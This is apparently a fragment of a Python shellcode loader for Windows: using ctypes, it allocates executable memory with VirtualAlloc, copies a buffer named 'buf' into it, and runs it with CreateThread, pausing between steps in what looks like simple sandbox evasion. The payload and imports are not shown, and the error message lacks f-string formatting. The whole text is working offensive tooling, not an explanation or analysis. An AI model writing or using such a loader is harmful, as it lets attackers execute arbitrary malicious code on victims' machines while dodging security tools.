

def main():
    try:
        kernel32 = ctypes.windll.kernel32
        kernel32.VirtualAlloc.argtypes = (wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.DWORD)
        kernel32.VirtualAlloc.restype = wt.LPVOID
        kernel32.CreateRemoteThread.argtypes = (wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.LPVOID, wt.LPVOID, wt.DWORD, wt.LPVOID)
        kernel32.CreateThread.restype = wt.HANDLE
        kernel32.RtlMoveMemory.argtypes = (wt.LPVOID, wt.LPVOID, ctypes.c_size_t)
        kernel32.RtlMoveMemory.restype = wt.LPVOID
        kernel32.WaitForSingleObject.argtypes = (wt.HANDLE, wt.DWORD)
        kernel32.WaitForSingleObject.restype = wt.DWORD
        memoryaddr = kernel32.VirtualAlloc(None, len(buf), 0x3000, 0x40)
        time.sleep(5)
        kernel32.RtlMoveMemory(memoryaddr, buf, len(buf))
        time.sleep(5)
        thrd = kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_void_p(memoryaddr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
        kernel32.WaitForSingleObject(thrd, -1)

    except Exception as error:
        print("[-] Error: {error}")
        quit()

if __name__ == "__main__":
    main()